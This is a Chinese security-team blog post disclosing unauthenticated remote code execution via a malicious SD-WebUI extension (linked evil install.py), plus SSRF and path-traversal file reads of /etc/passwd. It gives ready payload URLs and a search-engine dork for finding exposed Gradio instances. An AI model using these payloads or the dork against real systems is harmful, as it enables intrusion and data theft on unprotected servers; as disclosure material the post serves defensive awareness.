#  SD-WebUI未公开的0Day漏洞   
原创 ki9mu  OneTS安全团队   2024-11-22 02:00  
  
**点击蓝字**  
  
**关注我们**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/kJjVGsbcK2B4JcLtGicEoHD4HZ2y2whAMRQyl2H79RFZIxHykxBR5ZXl6RtAlfGBBzyaSA8ZM49AyUja2LW38ew/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
**声明**  
  
  
  
  
  
  
  
  
本文属于OneTS安全团队成员**ki9mu**的原创文章，转载请声明出处！本文章仅用于学习交流使用，因利用此文信息而造成的任何直接或间接的后果及损失，均由使用者本人负责，OneTS安全团队及文章作者不为此承担任何责任。  
  
  
**SD-WebUI介绍**  
  
  
  
Stable Diffusion是一款功能异常强大的AI图片生成器。  
它不仅支持生成图片，使用各种各样的模型来达到你想要的效果，还能训练你自己的专属模型，  
WebUI使得Stable Diffusion有了一个更直观的用户界面，更适合新手用户，该项目github高达143K的star数。  
  
项目地址如下：https://github.com/AUTOMATIC1111/stable-diffusion-webui  
  
  
  
**RCE漏洞描述**  
  
  
  
未授权访问的情况下，如果能够访问到用户自定义插件，可以通过构造恶意插件。  
  
fork如下代码：  
  
https://github.com/ki9mu/sd-evil-scrpits/blob/main/install.py  
  
更改相关的执行命令，在扩展插件中选择远程加载的项目地址即可正确安装  
  
https://github.com/ki9mu/sd-evil-scrpit  
s  
  
  
  
**0Day漏洞描述及复现**  
  
  
  
如果关闭扩展选项卡，目前还包括SSRF和任意文件读取。  
  
全回显SSRF：  
https://target/proxy=http://www.example.com  
  
  
任意文件读取：  
  
https://target/file=/mnt/ljh/stable-diffusion-webui/webui.sh  
  
https://target/file=../../../../../../etc/passwd（burp中请求）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/kJjVGsbcK2DcjQxkAumFhSE4BwQM8o0Rpn97zU1PxsHC5aUhXMFUB7tCl7FMFA29zNF1G7WcX81KmRDOj2lXjA/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
**漏洞影响版本**  
  
  
  
只要未授权都有问题  
  
  
  
  
  
**资产测绘平台Dork**  
  
  
```
# hunter语法
app="gradio"
```  
  
截至发文：（图源hunter）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/kJjVGsbcK2DcjQxkAumFhSE4BwQM8o0RtclKelc7c9q8tfeUjajNaUWSt7cRM77yzZW3wUNMAR4q66R1OQJehA/640?wx_fmt=png&from=appmsg "")  
  
  
  
**漏洞修复建议**  
  
  
  
增加访问权限控制  
  
  
  
